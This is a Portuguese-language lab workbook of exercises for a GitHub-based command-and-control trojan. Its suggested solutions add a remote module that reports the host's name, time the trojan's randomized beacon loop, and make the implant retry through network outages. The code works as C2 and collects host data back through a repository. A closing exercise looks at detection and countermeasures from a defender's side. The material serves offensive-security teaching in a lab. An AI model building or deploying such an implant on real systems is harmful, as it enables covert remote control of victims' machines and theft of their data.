# Caderno de Exercícios Práticos: 01 GitHub C2 (Completo)

**Material de Referência:** `02_GUIA_PRATICO_COMPLETO.md`
**Script Base:** `git_trojan.py`
**Alvo:** Repositório privado `bhtprojan` (laboratório)

---

## 🎯 Objetivo Desta Lista

Praticar automação de C2 real em laboratório:
* Manipulação de config JSON remoto.
* Entendimento de `threading` + sleep aleatório.
* Depuração de `base64` e `GitImporter`.
* Higiene de token e `.gitignore`.

---

## Exercício 2.1 — Adicionando Terceiro Módulo Remoto

### Enunciado
Crie `modules/hostname.py` no repo com função `run(**args)` que retorna `socket.gethostname()`, adicione ao `config/abc.json` e observe o trojan puxar sem reiniciar.

### Tarefas
1. Crie o arquivo local e faça `git push`.
2. Edite `abc.json` para incluir `{ "module": "hostname" }`.
3. Aguarde o próximo ciclo (ou reinicie o trojan em lab) e confirme `[*] Attempting to retrieve hostname` no terminal e novo `.data` em `data/abc/`.

### Resolução Sugerida
```python
# modules/hostname.py
import socket

def run(**args):
    print("[*] In hostname module.")
    return socket.gethostname()
```
```json
[
  { "module": "dirlister" },
  { "module": "environment" },
  { "module": "hostname" }
]
```

---

## Exercício 2.2 — Medindo Velocidade do Ciclo com `time`

### Enunciado
Adicione métricas como no material de brute force: quanto tempo dura um ciclo completo de `get_config + threads`?

### Tarefas
1. Importe `time` (já existe) e capture `inicio = time.time()` no início de `run()` por ciclo.
2. Após disparar as threads, calcule `duracao = time.time() - inicio`.
3. Exiba `[*] Ciclo concluído em X.XXs`.

### Resolução Sugerida
```python
def run(self):
    while True:
        inicio = time.time()
        config = self.get_config()
        for task in config:
            thread = threading.Thread(
                target=self.module_runner,
                args=(task['module'],))
            thread.start()
            time.sleep(random.randint(1, 10))
        duracao = time.time() - inicio
        print(f"[*] Ciclo concluído em {duracao:.2f}s.")
        time.sleep(random.randint(30 * 60, 3 * 60 * 60))
```

---

## Exercício 2.3 — Tolerância a Falha de Rede (`try/except`)

### Enunciado
Se o GitHub ficar inacessível, `github_connect()` quebra o trojan com traceback. Envolva `get_config()` em `try/except` para dormir e tentar de novo.

### Tarefas
1. Envolva `config = self.get_config()` em `try/except Exception as e`.
2. No `except`, imprima `[!] Falha ao buscar config: {e}` e dê `time.sleep(60)` + `continue`.
3. Teste desligando a rede do lab por 1 minuto.

### Resolução Sugerida
```python
def run(self):
    while True:
        try:
            config = self.get_config()
        except Exception as e:
            print(f"[!] Falha ao buscar config: {e}")
            time.sleep(60)
            continue
        # ... dispara threads ...
```

---

## Exercício 2.4 — Auditoria Blue Team: O que o GitHub Registra?

### Enunciado
Toda ação do trojan deixa rastro no repositório. Analise do ponto de vista defensivo.

### Tarefas
1. Liste quantos arquivos `.data` foram criados em `data/abc/` após 3 ciclos.
2. Decodifique um deles: `cat xxx.data | base64 -d`.
3. Responda em um parágrafo: quais **duas medidas** dificultariam este C2? (ex.: bloquear `api.github.com` no proxy + exigir MFA em tokens + monitorar `create_file` via audit log).

### Resposta Sugerida para Discussão em Sala
1. **Egress filtering / allowlist:** Bloquear `api.github.com` em estações que não precisam de GitHub, forçando o beacon a falhar.
2. **Token com escopo mínimo + expiração curta + audit log:** Token só com acesso ao repo privado, validade de horas e alerta em `create_file` fora do horário comercial.
